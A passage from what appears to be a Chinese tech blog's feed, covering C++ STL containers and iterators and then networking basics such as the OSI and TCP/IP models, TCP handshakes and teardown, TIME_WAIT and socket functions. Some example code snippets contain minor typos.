class="comment">//查找键为 &quot;animal&quot; 的键值对</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//找到第一个键的值大于或等于 &quot;animal&quot; 的键值对</span></span><br><span class="line">    <span class="keyword">auto</span> iter = myMap.<span class="built_in">lower_bound</span>(<span class="string">&quot;animal&quot;</span>);</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;lower：&quot;</span> &lt;&lt; iter-&gt;first &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; iter-&gt;second &lt;&lt; endl;</span><br><span class="line">   </span><br><span class="line">    <span class="comment">//找到第一个键的值大于 &quot;animal&quot; 的键值对</span></span><br><span class="line">    iter = myMap.<span class="built_in">upper_bound</span>(<span class="string">&quot;animal&quot;</span>);</span><br><span class="line">    cout &lt;&lt;<span class="string">&quot;upper：&quot;</span> &lt;&lt; iter-&gt;first &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; iter-&gt;second &lt;&lt; endl;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 找到值与 &quot;animal&quot; 的值相等的键值对</span></span><br><span class="line">    <span class="keyword">auto</span> myPair = myMap.<span class="built_in">equal_range</span>(<span class="string">&quot;animal&quot;</span>);  <span class="comment">// equal_range返回一个pair,第一个元素为lower_bound的返回值，第二个元素为upper_bound的返回值</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">auto</span> iter = myPair.first; iter != myPair.second; ++iter) &#123;</span><br><span class="line">        cout &lt;&lt; iter-&gt;first &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; iter-&gt;second &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="set"><a href="#set" class="headerlink" title="set"></a>set</h4><p>定义在 &lt;set&gt; 头文件中，使用该容器存储的数据，各个元素键和值完全相同，且各个元素的值不能重复（保证了各元素键的唯一性）。该容器会自动根据各个元素的键（其实也就是元素值）的大小进行升序排序。</p><p>和 map、multimap 容器不同，<strong>使用 set 容器存储的各个键值对，要求键 key 和值 value 必须相等</strong>。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;set&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line">set&lt;string&gt; mySet&#123;<span class="string">&quot;animal&quot;</span>, <span class="string">&quot;plant&quot;</span>&#125;</span><br><span class="line">string str = <span class="string">&quot;planet&quot;</span>;</span><br><span class="line"><span class="keyword">auto</span> retpair = mySet.<span class="built_in">insert</span>(str);</span><br><span class="line"><span class="keyword">auto</span> retpair = mySet.<span class="built_in">emplace</span>(str);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 删除元素</span></span><br><span class="line"><span class="type">int</span> num = mySet.<span class="built_in">erase</span>(<span class="string">&quot;animal&quot;</span>);  <span class="comment">// 根据值定位，返回成功删除的元素个数</span></span><br><span class="line"><span class="keyword">auto</span> iter = mySet.<span class="built_in">erase</span>(myset.<span class="built_in">begin</span>(), --myset.<span class="built_in">end</span>());  <span class="comment">// 根据迭代器定位，返回删除后所指向的迭代器</span></span><br><span class="line">mySet.<span class="built_in">clear</span>()</span><br></pre></td></tr></table></figure><p>insert()函数返回的 pair 类型的值，其包含 2 个数据，一个迭代器和一个 bool 值：</p><ul><li>当向 set 容器添加元素成功时，该迭代器指向 set 容器新添加的元素，bool 类型的值为 true；</li><li>如果添加失败，即证明原 set 容器中已存有相同的元素，此时返回的迭代器就指向容器中相同的此元素，同时 bool 类型的值为 false。</li></ul><p>emplace()函数与insert()一样，也能像set容器中添加元素，且效率更高。</p><h3 id="2-3-哈希容器"><a href="#2-3-哈希容器" class="headerlink" title="2.3 哈希容器"></a>2.3 哈希容器</h3><p>C++ 11 新加入 4 种关联式容器，分别是 unordered_set 哈希集合、unordered_multiset 哈希多重集合、unordered_map 哈希映射以及 unordered_multimap 哈希多重映射。和排序容器不同，哈希容器中的元素是未排序的，元素的位置由哈希函数确定。</p><h2 id="3-iterator迭代器"><a href="#3-iterator迭代器" class="headerlink" title="3. iterator迭代器"></a>3. iterator迭代器</h2><p>在 C++ STL 中，对容器中数据的读和写，是通过迭代器完成的，扮演着容器和算法之间的胶合剂，使得算法的设计可以泛化到各种数据结构，隐藏容器的内部差异。</p><p>STL标准库为每一种标准容器定义了一种迭代器类型，这意味着，不同容器的迭代器也不同，其功能强弱也有所不同。容器的迭代器的功能强弱，决定了该容器是否支持 STL 中的某种算法。</p><h3 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h3><p>常用的迭代器按功能强弱分为输入迭代器、输出迭代器、<strong>正向迭代器</strong>、<strong>双向迭代器</strong>、<strong>随机访问迭代器</strong> 5 种。主要使用后三种。</p><p><strong>1） 正向迭代器</strong></p><p>假设 p 是一个正向迭代器，则 p 支持 ++p，p++，*p 操作，还可以被复制或赋值，可以用 &#x3D;&#x3D; 和 !&#x3D; 运算符进行比较。此外，两个正向迭代器可以互相赋值。</p><p><strong>2） 双向迭代器</strong></p><p>双向迭代器具有正向迭代器的全部功能，除此之外，假设 p 是一个双向迭代器，则还可以进行 –p 或者 p– 操作（即一次向后移动一个位置）。</p><p><strong>3） 随机访问迭代器</strong></p><p>随机访问迭代器具有双向迭代器的全部功能。除此之外，假设 p 是一个随机访问迭代器，i 是一个整型变量或常量，则 p 还支持以下操作：</p><ul><li>p+&#x3D;i：使得 p 往后移动 i 个元素。</li><li>p-&#x3D;i：使得 p 往前移动 i 个元素。</li><li>p+i：返回 p 后面第 i 个元素的迭代器。</li><li>p-i：返回 p 前面第 i 个元素的迭代器。</li><li>p[i]：返回 p 后面第 i 个元素的引用。</li></ul><p>此外，两个随机访问迭代器 p1、p2 还可以用 &lt;、&gt;、&lt;&#x3D;、&gt;&#x3D; 运算符进行比较。另外，表达式 p2-p1 也是有定义的，其返回值表示 p2 所指向元素和 p1 所指向元素的序号之差（也可以说是 p2 和 p1 之间的元素个数减一）。</p><p>下表为 C++ 11 标准中不同容器所支持的迭代器类型：</p><table><thead><tr><th>容器</th><th>对应的迭代器类型</th></tr></thead><tbody><tr><td>array</td><td>随机访问迭代器</td></tr><tr><td>vector</td><td>随机访问迭代器</td></tr><tr><td>deque</td><td>随机访问迭代器</td></tr><tr><td>list</td><td>双向迭代器</td></tr><tr><td>set &#x2F; multiset</td><td>双向迭代器</td></tr><tr><td>map &#x2F; multimap</td><td>双向迭代器</td></tr><tr><td>forward_list</td><td>前向迭代器</td></tr><tr><td>unordered_map &#x2F; unordered_multimap</td><td>前向迭代器</td></tr><tr><td>unordered_set &#x2F; unordered_multiset</td><td>前向迭代器</td></tr><tr><td>stack</td><td>不支持迭代器</td></tr><tr><td>queue</td><td>不支持迭代器</td></tr></tbody></table><p><u>注意，容器适配器 stack 和 queue 没有迭代器，它们包含有一些成员函数，可以用来对元素进行访问。</u></p><h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><table><thead><tr><th>迭代器定义方式</th><th>具体格式</th></tr></thead><tbody><tr><td>正向迭代器</td><td>容器类名::iterator 迭代器名;</td></tr><tr><td>常量正向迭代器</td><td>容器类名::const_iterator 迭代器名;</td></tr><tr><td>反向迭代器</td><td>容器类名::reverse_iterator 迭代器名;</td></tr><tr><td>常量反向迭代器</td><td>容器类名::const_reverse_iterator 迭代器名;</td></tr></tbody></table><p><code>*迭代器名</code>就可以表示迭代器指向的元素。</p><p>反向迭代器和正向迭代器的区别在于：</p><ul><li>对正向迭代器进行 ++ 操作时，迭代器会指向容器中的后一个元素；</li><li>而对反向迭代器进行 ++ 操作时，迭代器会指向容器中的前一个元素。</li></ul><p><u>注意，以上 4 种定义迭代器的方式，并不是每个容器都适用。有一部分容器同时支持以上 4 种方式，比如 array、deque、vector；而有些容器只支持其中部分的定义方式，例如 forward_list 容器只支持定义正向迭代器，不支持定义反向迭代器</u></p><h3 id="举例"><a href="#举例" class="headerlink" title="举例"></a>举例</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span>  <span class="comment">//需要引入 vector 头文件</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    vector&lt;<span class="type">int</span>&gt; v&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>&#125;; <span class="comment">//v被初始化成有10个元素</span></span><br><span class="line">    <span class="comment">//第一种遍历方法：使用索引遍历，size返回元素个数</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; v.<span class="built_in">size</span>(); ++i)</span><br><span class="line">        cout &lt;&lt; v[i] &lt;&lt;<span class="string">&quot; &quot;</span>;</span><br><span class="line">    <span class="comment">//第二种遍历方法：创建一个正向迭代器，当然，vector也支持其他 3 种定义迭代器的方式</span></span><br><span class="line">    vector&lt;<span class="type">int</span>&gt;::iterator it;</span><br><span class="line">    <span class="keyword">for</span> (i = v.<span class="built_in">begin</span>(); i != v.<span class="built_in">end</span>(); ++i)  <span class="comment">// 或者i &lt; v.end()</span></span><br><span class="line">        cout &lt;&lt; *i &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line"><span class="comment">//间隔一个输出</span></span><br><span class="line">    i = v.<span class="built_in">begin</span>();</span><br><span class="line">    <span class="keyword">while</span> (i &lt; v.<span class="built_in">end</span>()) &#123; </span><br><span class="line">        cout &lt;&lt; *i &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">        i += <span class="number">2</span>; <span class="comment">// 随机访问迭代器支持 &quot;+= 整数&quot;  的操作</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="4-函数对象"><a href="#4-函数对象" class="headerlink" title="4. 函数对象"></a>4. 函数对象</h2><p>如果一个类将 () 运算符重载为成员函数，这个类就称为函数对象类，这个类的对象就是函数对象（又称仿函数）。</p><h2 id="5-适配器"><a href="#5-适配器" class="headerlink" title="5. 适配器"></a>5. 适配器</h2><p>可以使一个类的接口（模板的参数）适配成用户指定的形式，从而让原本不能在一起工作的两个类工作在一起。值得一提的是，容器、迭代器和函数都有适配器。</p><h2 id="6-内存分配器"><a href="#6-内存分配器" class="headerlink" title="6. 内存分配器"></a>6. 内存分配器</h2><p>为容器类模板提供自定义的内存申请和释放功能，由于往往只有高级用户才有改变内存分配策略的需求，因此内存分配器对于一般用户来说，并不常用。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;STL&quot;&gt;&lt;a href=&quot;#STL&quot; class=&quot;headerlink&quot; title=&quot;STL&quot;&gt;&lt;/a&gt;STL&lt;/h1&gt;&lt;p&gt;参考链接：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://c.biancheng.net/stl/&quot;&gt;http://c.bianch</summary>
      
    
    
    
    
    <category term="计算机基础" scheme="https://frankcao3.github.io/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/"/>
    
  </entry>
  
  <entry>
    <title>计算机网络</title>
    <link href="https://frankcao3.github.io/posts/28758"/>
    <id>https://frankcao3.github.io/posts/28758</id>
    <published>2021-08-14T16:00:00.000Z</published>
    <updated>2023-10-05T11:40:46.710Z</updated>
    
    <content type="html"><![CDATA[<h1 id="计算机网络"><a href="#计算机网络" class="headerlink" title="计算机网络"></a>计算机网络</h1><h2 id="计算机网络模型"><a href="#计算机网络模型" class="headerlink" title="计算机网络模型"></a>计算机网络模型</h2><h3 id="1-1-OSI参考模型"><a href="#1-1-OSI参考模型" class="headerlink" title="1.1 OSI参考模型"></a>1.1 OSI参考模型</h3><p><strong>国际标准化组织(ISO)<strong>提出的网络体系结构模型，称为开放系统互联参考模型(OSIRM)，通常简称为</strong>OSI参考模型</strong>。</p><p>OSI有七层，自下而上依次为物理层、数据链路层、网络层、传输层、会话层、表示层、应用层。其中数据链路层在概念上常被划分为两个子层：逻辑链路控制子层(LLC)和媒体访问控制子层(MAC)。</p><p><strong>数据链路层负责分配MAC地址。</strong>MAC地址，或称物理地址，由<strong>48比特长</strong>，12个十六进制数字组成，<strong>0~23位(前6位十六进制)是厂商向IETF（ 国际互联网工程任务组）等机构申请用来标识厂商的代码</strong>。地址的24到47位由厂商自行分派，是各个厂商制造的所有网卡的一个唯一编号。 因此一个<br>网卡会有一个全球唯一固定的MAC地址，但可对应多个IP地址。MAC地址的第48位是组播地址标志位。</p><p><strong>网络层负责对数据包进行路由选择和存储转发</strong>，网络层的协议有: IP、IPX、ICMP、IGMP、ARP、RARP、OSPF 等。网络层数据的单位称为<u>分组或数据包</u>。网络层提供点到点的通信（直接相连的结点之间的通信），仅提供一台机器到另一台机器之间的通信，不会涉及程序或进程的概念。</p><p><strong>传输层是第一个<u>端到端</u>，即进程到进程的层次</strong>。传输层提供应用进程间的逻辑通信。由于一个主机可同时运行多个进程，因此传输层有复用和分用的功能。传输层的协议有: TCP、 UDP、 SCTP 等。传输层数据的单位称为<u>报文或数据段</u>。</p><p>应用层为操作系统或者网络应用程序提供访问网络服务的接口。应用层的协议有: RIP、TELNET、FTP、HTTP、SNMP等。</p><table><thead><tr><th>OSI参考模型</th><th>功能</th><th>协议</th><th>设备</th></tr></thead><tbody><tr><td>物理层</td><td></td><td></td><td>中继器、集线器</td></tr><tr><td>数据链路层</td><td>分配MAC地址</td><td></td><td>网桥、交换机</td></tr><tr><td>网络层</td><td>对数据包进行路由选择和存储转发（点到点）</td><td>IP、IPX、ICMP、IGMP、ARP、RARP、OSPF等</td><td>路由器</td></tr><tr><td>传输层</td><td>提供进程间的逻辑通信（端到端）</td><td>TCP、 UDP、 SCTP等</td><td></td></tr></tbody></table><p><strong>网关</strong>是网络层以上的中继系统。默认网关在网络层以上实现网络互连，实质上是一个网络通向其他网络的IP地址。</p><h3 id="1-2-TCP-x2F-IP模型"><a href="#1-2-TCP-x2F-IP模型" class="headerlink" title="1.2 TCP&#x2F;IP模型"></a>1.2 TCP&#x2F;IP模型</h3><p>TCP&#x2F;IP模型由于得到广泛应用而成为事实上的国际标准，从低到高依次为：网络接口层、网际层、传输层和应用层。</p><p>OSI七层模型和TCP&#x2F;IP五层模型的对应关系如下：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220704093830695.png" alt="image-20220704093830695"></p><p><strong>网际层</strong>是TCP&#x2F;IP体系结构的关键部分。它和OSI网络层在功能上非常相似。网际层<strong>将分组发往任何网络，并为之独立地选择合适的路由，但它不保证各个分组有序到达，各个分组的有序交付由高层负责</strong>。网际层定义了标准的分组格式和协议，即IP协议。当前采用的IP协议是第4版，即IPv4，它的下一-个版本是IPv6。</p><p><strong>传输层</strong>的功能同样和OSI中的传输层类似，是<strong>使发送端和目的端主机上的对等实体可以进行会话</strong>。</p><p>传输层主要使用以下两种协议:</p><ul><li>传输控制协议（Transmission Control Protocol, TCP）。 它是面向连接的，数据传输的单位是报文段，能够提供可靠的交付。</li><li>用户数据报协议(User Datagram Protocol, UDP)。 它是无连接的，数据传输的单位是用户数据报，不保证提供可靠的交付，只能提供“尽最大努力交付”。</li></ul><p><strong>应用层</strong>包含所有的高层协议。如虚拟终端协议(Telnet)、 文件传输协议(FTP)、 域名解析服务(DNS)、电子邮件协议(SMTP)和超文本传输协议(HTTP)。</p><h2 id="传输层与socket基本操作"><a href="#传输层与socket基本操作" class="headerlink" title="传输层与socket基本操作"></a>传输层与socket基本操作</h2><h3 id="2-1-传输层"><a href="#2-1-传输层" class="headerlink" title="2.1 传输层"></a>2.1 传输层</h3><p>在下图中，展示了IPv4和IPv6。从右向左观察这个图，最右边的4个网络应用使用IPv6，另外的5个网络应用使用IPv4。</p><p>最左边的网络应用tpdump直接使用BPF（BSD分组过滤器）或DLPI（数据链路提供者接口）同数据链路层进行通信。ping使用ICMP协议。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220704094553193.png" alt="image-20220704094553193"></p><h5 id="UDP"><a href="#UDP" class="headerlink" title="UDP"></a>UDP</h5><p>用户数据报协议(User Datagram Protocol)，<strong>面向数据报文</strong>。UDP是一种<strong>无连接</strong>协议，因为UDP客户与服务器不必存在长期的关系，例如一个UDP客户创建一个套接字并发送一个数据报给一个服务器，然后立即用同一个套接字发送另一个数据报给另外一个服务器。同样，一个UDP服务器可以用同一个UDP套接字从若干不同的客户一连串接受多个数据报。</p><p>UDP是<strong>不可靠</strong>的，不能保证最终到达它们的目的地，<strong>不保证各个数据报的先后顺序跨网络保持不变，也不保证每个数据报只到达一次</strong>。</p><p>UDP既可以使用IPv4,也可以使用IPv6。</p><h5 id="TCP"><a href="#TCP" class="headerlink" title="TCP"></a>TCP</h5><p>传输控制协议(Transmission Control Protocol)，<strong>面向字节流</strong>。</p><p>第一，TCP 是一种<strong>面向连接</strong>的协议，提供客户与服务器的连接。</p><p>第二，TCP提供<strong>可靠性</strong>。当使用TCP向另一端发送数据时，它要求对端返回一个确认。如果没有收到确认，TCP自动重传数据并等待更长时间。在数次重传失败后，TCP才放弃。</p><p>第三，TCP通过<strong>给所发送数据的每一个字节关联一个序列号进行排序</strong>。UDP提供不可靠的数据报传送，不提供确认、序列号、超时重传等机制。</p><p>第四，TCP<strong>提供流量控制</strong>，而UDP不提供流量控制。TCP总是告诉对端它能够接收多少字节的数据，这称为<strong>通告窗口</strong>。该窗口在任何时刻都指出接收缓冲区中的可用空间，从而确保发送端发送的数据不会溢出接收缓冲区。</p><p>第五，TCP的连接是全双工的。UDP也可以是全双工的。</p><p>TCP既可以使用IPv4，也可以使用IPv6。</p><p><strong>UDP与TCP的主要区别在于UDP不一定提供可靠的数据传输</strong>。事实上，该协议不能保证数据准确无误地到达目的地。UDP在许多方面非常有效，如UDP具有对系统资源要求较少、具有较好的实时性、网络开销小的优点。当某个程序的目标是尽快地传输尽可能多的信息时(其中任意给定数据的重要性相对较低)，可使用UDP。</p><h3 id="2-2-TCP连接的建立和终止"><a href="#2-2-TCP连接的建立和终止" class="headerlink" title="2.2 TCP连接的建立和终止"></a>2.2 TCP连接的建立和终止</h3><p>以下给出了一个基本TCP客户端和服务器程序的套接口函数：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220704095345763.png" alt="image-20220704095345763"></p><p>对于服务器端，其先调用socket函数（返回一个套接字），然后套接字与地址、端口绑定（bind），对端口进行监听（listen），调用accept阻塞，等待客户端连接。</p><p>这时如果有客户端调用socket函数（返回一个套接字），然后连接服务器（connect），如果连接成功，客户端与服务器端的连接就建立了。客户端发送数据请求，服务器端接收请求并处理请求，然后把响应数据发送给客户端，客户端读取数据，最后关闭连接，一次交互结束。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220704100516344.png" alt="image-20220704100516344"></p><h4 id="三次握手建立连接"><a href="#三次握手建立连接" class="headerlink" title="三次握手建立连接"></a>三次握手建立连接</h4><hr><ul><li>客户端向服务器发送一个SYN J；</li><li>服务器向客户端响应一个SYN K，并对SYN J进行确认ACK J+1；</li><li>客户端再向服务器发送一个确认ACK K+1。</li></ul><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220704100639833.png" alt="image-20220704100639833"></p><p>从图中可以看出，服务器必须准备好接受外来的连接。这通过socket、bind 和listen函数来完成，称为<strong>被动打开</strong>。</p><p>客户端通过<strong>调用connect进行主动打开</strong>。这引起客户端向服务器发送了SYN J （表示同步，它告诉服务器客户将在连接中发送的数据的初始序列号）分节，这时connect进入阻塞状态。</p><p>服务器监听到连接请求，即收到SYN J分节，<strong>调用accept函数接受请求</strong>，并向客户端发送SYN K （它告诉客户端服务器将在连接中发送的数据的初始序列号）、ACK J+1分节，这时accept进入阻塞状态。</p><p>客户端收到服务器的SYN K、ACK J+1 分节之后，这时<strong>connect返回</strong>，并对SYN K分节进行确认，再向服务器发送ACK K+1分节；</p><p>服务器收到ACK K+1分节时，<strong>accept 返回</strong>，至此三次握手完毕，连接建立。</p><p>总结：客户端的connect在三次握手的第二次返回，而服务器端的accept在三次握手的第三次返回。</p><p>&#x3D;&#x3D;<strong>TCP为什么不采用二次握手：</strong>&#x3D;&#x3D;</p><p>采用三次握手是为了防止失效的连接请求报文段突然又传送到服务器，从而发生错误。</p><p>比如，客户端第一次发送的连接请求并没有丢失，而是因为网络问题导致延迟到达服务器，<u>服务器以为是客户端又发起的新连接</u>，于是服务器同意连接，并向客服端发回确认，但是此时客户端处于建立连接的状态，所以不予理会，服务器就一直等待客户端发送数据， 导致服务器的资源浪费。</p><h4 id="四次挥手释放连接"><a href="#四次挥手释放连接" class="headerlink" title="四次挥手释放连接"></a>四次挥手释放连接</h4><hr><p><strong>&#x3D;&#x3D;建立连接需要三次握手，而终止连接需要四次挥手。这是由TCP的半关闭造成的。既然TCP连接是全双工的（数据在两个方向可以同时传递），因此每个方向必须单独地进行关闭。&#x3D;&#x3D;</strong></p><p>下图中是客户执行主动关闭，然而不管是客户还是服务器都可以执行主动关闭。通常情况下是客户执行主动关闭，但某些协议如HTTP则是服务器执行主动关闭。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220704101542526.png" alt="image-20220704101542526"></p><p><img src="https://images.xiaozhuanlan.com/photo/2020/42b857c3a2046b9907075e326125d662.png" alt="img"></p><p>具体步骤: </p><ol><li><p>某个应用进程首先调用close，我们称这一端执行<strong>主动关闭</strong>。 这一端的TCP于是发送一一个FIN分节，表示数据发送完毕；</p></li><li><p>另一端接收到FIN分节之后，执行<strong>被动关闭</strong>，对这个FIN进行ACK确认。它的接收也作为文件结束符传递给接收端应用进程，因为<u>FIN的接收意味着应用进程在相应的连接上再也接收不到额外数据</u>；</p></li><li><p><strong><u>一段时间之后</u><strong>，接收到文件结束符的应用进程调用close关闭它的套接口。这导致它的TCP</strong>也发送一一个FIN</strong>；</p></li><li><p>接收到这个FIN的原发送端TCP (即执行主动关闭的那一端) 对它<strong>进行确认</strong>。</p></li></ol><p>这样<strong>每个方向上都有一个FIN和ACK，所以一共需要四个分节</strong>。我们使用限定词“一般”是因为：有时步骤1)的FIN随数据一起发送；另外，执行被动关闭那一端的TCP在步骤2)和3)发出的ACK与FIN也可以合并成一个分节（当自己已经没有数据要发送了，可以直接关闭连接），这样的话就是三个报文完成连接的释放。</p><p>TCP关闭时，每一端都要发送一个FIN。这种情况除了在应用进程调用close时会发生，还会在进程终止时发生。进程终止包括自愿（调用exit或从main函数返回）、不自愿（进程收到一个终止本进程的信号）的情况，进程终止时所有打开的TCP连接上都会发出一个FIN。</p><p>&#x3D;&#x3D;<strong>TCP释放连接为什么需要四次挥手：</strong>&#x3D;&#x3D;</p><p>关闭连接时，<u>当收到对方的FIN报文通知时，它仅仅表示对方没有数据发送给你了</u>（单方向），但未必你所有的数据都全部发送给对方了，所以<u>你未必会马上关闭socket，也即你可能还需要发送一些数据给对方之后，再发送FIN报文给对方来表示你没有数据发送给对方了</u>，针对每个FIN报文，都需要一次ack报文，故需要四次挥手。</p><p><a href="https://github.com/whuchris/Interview/blob/master/Java/TCP%E5%92%8CUDP%E5%8D%8F%E8%AE%AE.md">https://github.com/whuchris/Interview/blob/master/Java/TCP%E5%92%8CUDP%E5%8D%8F%E8%AE%AE.md</a></p><p>握手的过程中可以说没有信息数据的传输，是一个相互应答的过程，所以服务器会将SYN ACK一起发送，但是客户端发送终止连接的时候，很有可能服务器还有一些数据没有发送完，所以服务器只是先答应，但是需要等待数据传输完毕之后再发送FIN报文，ACK和FIN是分开的，因此多了一次。</p><h3 id="2-3-TCP状态转换图"><a href="#2-3-TCP状态转换图" class="headerlink" title="2.3 TCP状态转换图"></a>2.3 TCP状态转换图</h3><hr><p>TCP连接的建立和终止可以用状态转换图来说明，如图2-5所示。这些状态可使用netstat显示，它是一个在调试客户&#x2F;服务器应用时很有用的工具。</p><p>TCP为一个连接定义了11种状态，并且TCP规则规定如何基于当前状态及在该状态下所接收的分节从一个状态转换到另一个状态。举例来说，当某个应用进程在CLOSED状态下执行主动打开时，TCP将发送一个SYN，且新的状态是SYN_ SENT。如果这个TCP接着接收到一个带ACK的SYN，它将发送一个ACK，且新的状态是ESTABLISHED。这个最终状态是绝大多数数据传送发生的状态。</p><p>自ESTABLISHED状态引出的两个箭头处理连接的终止。如果某个应用进程在接收到文件结束符之前调用close (主动关闭)，那就转换到FIN _WAIT_1状态。但如果某个应用进程在ESTABLISHED状态期间接收到一个FIN (被动关闭),那就转换到CLOSE WAIT状态。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220704104439563.png" alt="image-20220704104439563"></p><p>图2-6给出了一个完整的TCP连接所发生的实际分组交换情况：建立连接、传送数据和终止连接。图中展示了每个端点所经历的TCP状态。从图2-6可见，当客户端应用程序主动请求关闭时，调用close或shutdown关闭连接，这时应用程序发送FIN，然后进入FIN_WAIT_1状态，等待服务器端发送确认包ACK，接受到服务器端的ACK以后，然后客户端进入FIN_WAIT_2状态，等待服务器端调用close, 并发送FIN,当客户端接受到FIN后，发送ACK，进入最终的TIME_WAIT状态。</p><p>需要注意的是，执行主动关闭的那一端进入&#x3D;&#x3D;TIME WAIT状态&#x3D;&#x3D;。<strong>留在TIME_ WAIT的持续的时间是&#x3D;&#x3D;MSL&#x3D;&#x3D; (最长分节生命周期Maximum Segment Liftime)时间的2倍，也就是2MSL。</strong>MSL一般情况下是30秒到2分钟，所以TIME_WAIT的时间一般为1~4分钟。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220704154040857.png" alt="image-20220704154040857"></p><p>&#x3D;&#x3D;<strong>存在TIME_WAIT状态有两个理由：</strong>&#x3D;&#x3D;</p><ul><li><p>实现终止TCP全双工连接的可靠性</p><p><u>假设最终的ACK丢失，服务器将重发最终的FIN，因此客户必须维护状态信息以允许它重发最终的ACK</u>。如果不维护状态信息，它将响应以RST，而服务器则把该分节解释成一个错误。 如果TCP打算执行所有必要的工作以彻底终止某个连接上两个方向的数据流，那么它必须能够处理连接终止序列四个分节中任何一个分节丢失的情况，也即主动关闭的那一端必须进入TIME_WAIT状态，因为它可能不得不重发最终的ACK。</p></li><li><p>允许老的重复分节在网络中消逝</p><p>我们假设12.106.32.254端口1500和206.168.112.219端口21之间有一个TCP连接，我们关闭这个连接后，在以后某个时候又重新建立起相同的IP地址和端口之间的TCP连接。后一个连接称为前一个连接的化身，因为它们的IP地址和端口号是相同的，<u>TCP必须防止来自某个连接的老重复分组在连接终止后再现，从而被误解成属于同一个连接的化身（被误解为属于新建的连接）。</u>要实现这种功能，TCP不能给处于TIME_WAIT状态的连接启动新的化身，<u>既然TME_WAIT状态的持续时间是2MSL，这就足够让某个方向上的分组最多存活MSL秒即被丢弃，另一个方向上的应答最多存活MSL秒也被丢弃</u>，通过实施这个规则，我们就能保证当成功建立一个 TCP连接时，来自该连接先前的化身的老重复分组都已在网络中消逝了。</p></li></ul><h3 id="2-4-socket的基本操作"><a href="#2-4-socket的基本操作" class="headerlink" title="2.4 socket的基本操作"></a>2.4 socket的基本操作</h3><hr><p>一个面向连接的客户端socket程序的主要步骤：</p><ol><li><p>加载套接字库</p></li><li><p>创建套接字socket()</p></li><li><p>向服务器发送连接请求connect()</p></li><li><p>和服务器端进行通信</p></li><li><p>关闭套接字close()</p></li></ol><ol><li><p><strong>socket()函数</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">socket</span><span class="params">(<span class="type">int</span> domain, <span class="type">int</span> type, <span class="type">int</span> protocol)</span></span>;</span><br></pre></td></tr></table></figure><p>socket函数在成功时返回一个小的非负整数值，称为套接口描述字(Socket Descriptor)， 简称套接字。这个套接字跟文件描述字相似。</p><p>socket函数的三个参数分别为:</p><ol><li><p><strong>domain</strong>：即协议域，又称为协议族(family)。常用的协议族有: AF_ INET、 AF_ INET6、AF LOCAL（或称AF_ UNIX，UNIX域socket）、AF_ ROUTE等。协议族决定了套接口的地址类型，在通信中必须采用对应的地址，如AF_ INET决定了要用IPv4地址(32位的)与端口号(16位的)的组合、AF_UNIX决定了要用一个绝对路径名作为地址。</p></li><li><p><strong>type</strong>：指定套接口类型。常用的socket类型有: 